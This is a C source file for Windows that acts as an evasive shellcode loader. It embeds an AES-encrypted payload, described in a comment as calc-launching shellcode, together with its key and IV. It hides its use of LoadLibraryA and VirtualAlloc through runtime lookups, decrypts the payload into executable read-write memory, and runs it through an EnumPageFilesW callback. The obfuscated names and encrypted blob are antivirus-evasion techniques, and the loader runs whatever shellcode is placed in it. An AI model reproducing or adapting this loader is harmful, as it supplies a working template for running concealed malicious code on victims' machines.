#include <windows.h>
#include <stdio.h>
#include <psapi.h>

// alfarom256 calc shellcode
unsigned char ke185hams[] = {0x1, 0xf6, 0x78, 0x1d, 0x59, 0x1f, 0xac, 0x27, 0xf0, 0x3d, 0xc3, 0x80, 0x3, 0x35, 0x26, 0x46};
unsigned char AESiv[] = { 0x24, 0x2c, 0xd4, 0xfb, 0x9f, 0xc5, 0xdc, 0x52, 0xee, 0xc5, 0xb4, 0xcc, 0xad, 0xe9, 0xb7, 0x8b };
    
unsigned char itsthecod345[] = {0x4b, 0x3e, 0x63, 0xfd, 0xe8, 0x36, 0xc3, 0xb4, 0x63, 0x1d, 0x3f, 0x40, 0xda, 0x6b, 0xfc, 0x6c, 0xdc, 0x34, 0x89, 0xbf, 0x9d, 0x4c, 0xda, 0x86, 0x65, 0x98, 0x88, 0xc0, 0xa3, 0x3c, 0xb9, 0x6a, 0xda, 0x13, 0x33, 0xb8, 0xf0, 0x1f, 0xed, 0x18, 0x19, 0x88, 0x60, 0xcb, 0x86, 0x74, 0xd6, 0x82, 0xd6, 0x24, 0x1c, 0x93, 0xf7, 0x73, 0xce, 0x1f, 0x81, 0xe8, 0x9f, 0xb5, 0x6e, 0xb8, 0xc4, 0x9f, 0xd7, 0xb3, 0xd6, 0x25, 0x6d, 0xa1, 0xbb, 0xf, 0x1e, 0xc6, 0xcb, 0x12, 0x5, 0x1b, 0xc6, 0x1d, 0x40, 0xc6, 0xce, 0x45, 0x5c, 0xc1, 0xa, 0x1f, 0xa6, 0xb2, 0x83, 0x67, 0x93, 0x65, 0x50, 0xb0, 0xb6, 0xf0, 0xee, 0x41, 0x9, 0xe3, 0x88, 0x12, 0x9f, 0xf5, 0x1e, 0xfc, 0xfd, 0xdd, 0x4, 0x32, 0xbe, 0x0, 0x37, 0x5a, 0xe8, 0x97, 0x84, 0xe9, 0x34, 0xcf, 0xc4, 0x3c, 0xbe, 0x95, 0x44, 0x7d, 0x8b, 0x4f, 0x5, 0xc9, 0x28, 0x1e, 0xae, 0xe0, 0x5a, 0x44, 0xcf, 0xb0, 0xd1, 0x96, 0x15, 0x3d, 0x87, 0xa5, 0x1d, 0x76, 0x96, 0x6a, 0xad, 0xaa, 0x5e, 0x7c, 0x87, 0xd1, 0xd6, 0x6e, 0x46, 0x7e, 0x5, 0x87, 0x57, 0x60, 0x6c, 0xc7, 0x7e, 0x2, 0x8f, 0x98, 0xb4, 0x14, 0xbb, 0xf6, 0xf3, 0xf8, 0x98, 0x58, 0x40, 0x35, 0x19, 0x12, 0xf, 0x5e, 0xa2, 0x78, 0x82, 0xdc, 0xb8, 0x26, 0xce, 0x27, 0xb1, 0x36, 0x2c, 0x8e, 0x9f, 0x48, 0x3a, 0xd3, 0x56, 0xca, 0x2d, 0xb4, 0xc1, 0x2, 0x92, 0xf2, 0xcd, 0xbc, 0x39, 0x57, 0xd1, 0xc7, 0x78, 0xe0, 0xaf, 0xc7, 0x8, 0x86, 0xe8, 0xc2, 0xcf, 0x5f, 0x99, 0x2c, 0xc7, 0xa8, 0xf5, 0xa2, 0x3c, 0x9a, 0x98, 0x3b, 0x4, 0x19, 0x27, 0x2f, 0x7a, 0x77, 0x63, 0xaa, 0xe1, 0xd7, 0xc0, 0xe6, 0xe9, 0x6e, 0x36, 0x85, 0xbe, 0xdf, 0x9d, 0x90, 0x46, 0x2a, 0x72, 0x9c, 0xa6, 0xde, 0xe9, 0x9a, 0xf6, 0xb4, 0x47, 0xd5, 0x13, 0xd6, 0xd2, 0xe3, 0x71, 0xed, 0xbf, 0xb2, 0x5d, 0x6a, 0xc9, 0x52, 0x16, 0x15, 0xc8, 0xf7, 0x20, 0xee, 0xfb, 0x25, 0x52, 0xc7, 0xae, 0x27, 0xda, 0xcf, 0xa5, 0x97, 0x46, 0xe1, 0xca, 0x41, 0xb6, 0xc9, 0x35, 0x4b, 0x8, 0xbe, 0xcc, 0x57, 0x71, 0x78, 0xdb, 0xd, 0xdc, 0x37, 0x62, 0x58, 0x63, 0xe0, 0x72, 0x60, 0x77, 0x12, 0x86, 0x9f, 0x4e, 0x6a, 0xd3, 0x5, 0xa7, 0x4d, 0x8, 0xb5, 0xcd, 0x3c, 0x8, 0x3b, 0x9b, 0x1c, 0xc7, 0x93, 0x6d, 0x29, 0xd4, 0xc8, 0x34, 0xce, 0x21, 0x67, 0x25, 0xff, 0xb3, 0x15, 0xb8, 0xdc, 0x5c, 0xa1, 0x38, 0xe7, 0xbc, 0xf4, 0xcd, 0xe7, 0x6c, 0xe4, 0xe1, 0x8d, 0xf6, 0x3e, 0x7c, 0xf4, 0x59, 0x91, 0xd1, 0x25, 0x69, 0xe6, 0x37, 0x37, 0x4, 0xd5, 0x40, 0x5c, 0xbb, 0xa3, 0x19, 0xb6, 0xd2, 0xd8, 0xf6, 0x7d, 0x41, 0xb8, 0xae, 0x5b, 0x25, 0xd9, 0xb, 0xfe, 0x36, 0x29, 0x8, 0xb2, 0xe3, 0xf7, 0x41, 0x58, 0x37, 0xb5, 0x86, 0xfb, 0x38, 0x4e, 0xbc, 0x6, 0x5b, 0xe2, 0xc8, 0xcd, 0xb8, 0x3e, 0xfd, 0x0, 0x7c, 0x94, 0xc6, 0xfb, 0x21, 0x7, 0xe3, 0xaf, 0xe6, 0x60, 0xd0, 0x69, 0x6d, 0x67, 0x9c, 0x53, 0xb2, 0x7f, 0xee, 0xae, 0x80, 0xf, 0xdd, 0xb8, 0xd9, 0xc3, 0x46, 0x9f, 0x83, 0xb3, 0x43, 0x27, 0xfd, 0x6d, 0x68, 0x91, 0x8, 0x7f, 0xf9, 0x7a, 0x5e, 0x4a, 0xa0, 0x1c};

    
    
void aesdecrypt(char* data, DWORD dataLen, char* key, DWORD keyLen, char* iv, DWORD ivLen) {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)key, keyLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv, 0);
    CryptDecrypt(hKey, 0, FALSE, 0, (BYTE*)data, &dataLen);

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}

typedef HMODULE(WINAPI* tlloadlibraryA)(LPCSTR);

HMODULE coolloadliba(LPCSTR lpLibFileName){

    HMODULE hModule = NULL;
    HMODULE kern332= GetModuleHandleA("kernel32.dll");
    if(kern332){
       tlloadlibraryA ploadliba = (tlloadlibraryA)GetProcAddress(kern332,"LoadLibraryA");
       if(ploadliba){
          hModule = ploadliba(lpLibFileName);
       }
      }
     return hModule;
   }



int main() {

    HMODULE ker32=coolloadliba("kernel32.dll");
    
    LPVOID (*pvirtualalloc)(LPVOID,SIZE_T,DWORD, DWORD)=(LPVOID(*)(LPVOID , SIZE_T,DWORD, DWORD))GetProcAddress(ker32, "VirtualAlloc");
    
    LPVOID addr = pvirtualalloc(NULL, sizeof(itsthecod345), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    aesdecrypt((char*)itsthecod345, sizeof(itsthecod345), (char*)ke185hams, sizeof(ke185hams), (char*)AESiv, sizeof(AESiv));
        
    RtlMoveMemory(addr, itsthecod345, sizeof(itsthecod345));

    ::EnumPageFilesW((PENUM_PAGE_FILE_CALLBACKW)addr, NULL);
}
